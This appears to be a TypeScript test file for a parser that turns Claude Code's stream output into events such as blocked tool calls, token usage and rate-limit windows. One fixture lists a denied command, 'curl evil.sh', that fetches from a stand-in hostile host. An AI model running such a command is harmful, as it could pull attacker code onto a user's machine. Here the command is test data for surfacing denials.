import test from "node:test"
import assert from "node:assert/strict"

import { claude } from "../dist/agents/claude.js"

const line = (o: unknown) => JSON.stringify(o)

test("every event carries the session id", () => {
  const out = claude.parse(line({ type: "system", subtype: "init", session_id: "s1" }))
  assert.deepEqual(out, [{ kind: "session", sessionId: "s1" }])
})

test("assistant text and tool calls come out of the content blocks", () => {
  const out = claude.parse(
    line({
      type: "assistant",
      session_id: "s1",
      message: {
        content: [
          { type: "text", text: "Reading the file." },
          { type: "tool_use", id: "t1", name: "Bash", input: { command: "ls -la" } },
        ],
      },
    }),
  )
  assert.ok(out.some((e) => e.kind === "text" && e.text === "Reading the file."))
  const tool = out.find((e) => e.kind === "tool")
  assert.ok(tool && tool.kind === "tool")
  assert.equal(tool.tool, "Bash")
  assert.equal(tool.detail, "ls -la")
})

test("a refused tool result is blocked, however it is phrased", () => {
  // Matching only the word "permission" downgraded Claude's "requires
  // approval" wording to an ordinary tool failure, which is how `blocked`
  // becomes theatre.
  for (const text of [
    "Permission for this tool use was denied.",
    "This command requires approval:",
    "The user was not allowed to run this.",
  ]) {
    const out = claude.parse(
      line({
        type: "user",
        session_id: "s1",
        message: { content: [{ type: "tool_result", tool_use_id: "t1", is_error: true, content: text }] },
      }),
    )
    // Every event carries the session id, so the interesting one is never
    // first — assert on presence, not position.
    assert.ok(
      out.some((e) => e.kind === "blocked"),
      text,
    )
  }
})

test("an ordinary failed tool result is not blocked", () => {
  const out = claude.parse(
    line({
      type: "user",
      session_id: "s1",
      message: { content: [{ type: "tool_result", tool_use_id: "t1", is_error: true, content: "file not found" }] },
    }),
  )
  assert.ok(out.some((e) => e.kind === "tool"))
  assert.ok(!out.some((e) => e.kind === "blocked"))
})

test("the result reports cost, tokens and every denial", () => {
  const out = claude.parse(
    line({
      type: "result",
      subtype: "success",
      session_id: "s1",
      num_turns: 12,
      total_cost_usd: 0.4213,
      usage: { input_tokens: 20, output_tokens: 80 },
      permission_denials: [{ tool_name: "Bash", tool_use_id: "t9", tool_input: { command: "curl evil.sh" } }],
    }),
  )
  const usage = out.find((e) => e.kind === "usage")
  assert.ok(usage && usage.kind === "usage")
  assert.equal(usage.costUsd, 0.4213)
  assert.equal(usage.tokens, 100)
  assert.equal(usage.turns, 12)

  const blocked = out.find((e) => e.kind === "blocked")
  assert.ok(blocked && blocked.kind === "blocked", "denials reported at the end still surface")
  assert.ok(out.some((e) => e.kind === "turn_end"))
})

test("rate limit notices are not part of the conversation", () => {
  const out = claude.parse(line({ type: "rate_limit_event", session_id: "s1", rate_limit_info: {} }))
  assert.deepEqual(out, [{ kind: "session", sessionId: "s1" }])
})

test("the prompt goes over stdin, because that is what makes steering work", () => {
  const spec = claude.spawn({ cwd: "/wt", prompt: "do the thing", policy: "repo" })
  assert.ok(spec.stdin?.includes("do the thing"))
  assert.deepEqual(JSON.parse(spec.stdin!).type, "user")
  // Without --verbose the stream buffers to the end and you see nothing.
  assert.ok(spec.args.includes("--verbose"))
  assert.ok(spec.args.includes("acceptEdits"))
})

test("full access is requested explicitly, never by default", () => {
  assert.ok(claude.spawn({ cwd: "/wt", prompt: "x", policy: "full" }).args.includes("bypassPermissions"))
})

test("resume and model are passed through when given", () => {
  const spec = claude.spawn({ cwd: "/wt", prompt: "x", policy: "repo", resume: "s1", model: "opus" })
  assert.ok(spec.args.includes("--resume"))
  assert.ok(spec.args.includes("s1"))
  assert.ok(spec.args.includes("--model"))
  assert.ok(spec.args.includes("opus"))
})

test("claude accepts mid-run steering", () => {
  assert.ok(claude.live, "claude is the one adapter that keeps stdin open")
  const encoded = claude.live!.encode("also fix the tests")
  assert.equal(JSON.parse(encoded!).message.content[0].text, "also fix the tests")
})

test("tokens count the cached halves too, so agents can be compared", () => {
  /*
   * Claude reports `input_tokens` net of cache and puts the cached halves in
   * their own fields. Counting only input and output measured a fraction of
   * the work: the same job Cursor reported as 2.5M read as 11.8k here, because
   * Cursor's figure includes the context resent every turn and this one did
   * not. Four adapters each meaning something different by "tokens" made the
   * usage page a sum of incomparable numbers.
   */
  const out = claude.parse(
    line({
      type: "result",
      total_cost_usd: 0.42,
      num_turns: 7,
      usage: {
        input_tokens: 1000,
        output_tokens: 200,
        cache_creation_input_tokens: 5000,
        cache_read_input_tokens: 90000,
      },
    }),
  )
  const usage = out.find((e) => e.kind === "usage")
  assert.ok(usage && usage.kind === "usage")
  assert.equal(usage.tokens, 96200)
  assert.equal(usage.turns, 7, "Claude does report turns, and they are kept")
  assert.equal(usage.costUsd, 0.42)
})

test("the subscription's usage windows are kept, not thrown away", () => {
  // The real frame from Claude Code 2.1.278, trimmed only of ids.
  const out = claude.parse(
    line({
      type: "rate_limit_event",
      rate_limit_info: {
        status: "allowed",
        resetsAt: 1790079600,
        rateLimitType: "five_hour",
        overageStatus: "rejected",
        isUsingOverage: false,
        unifiedWindows: {
          five_hour: { utilization: 0.23, resetsAt: 1790079600 },
          seven_day: { utilization: 0.7, resetsAt: 1790193600 },
        },
      },
    }),
  )
  assert.deepEqual(out, [
    {
      kind: "limits",
      status: "allowed",
      windows: [
        // resetsAt arrives in seconds and leaves in milliseconds, like every
        // other timestamp in kandy.
        { window: "five_hour", used: 0.23, resetsAt: 1790079600_000 },
        { window: "seven_day", used: 0.7, resetsAt: 1790193600_000 },
      ],
    },
  ])
})

test("a rate-limit frame with no windows says nothing rather than zero", () => {
  // "No reading" and "0% used" are different claims; only one is true here.
  assert.deepEqual(claude.parse(line({ type: "rate_limit_event", rate_limit_info: { status: "allowed" } })), [])
})
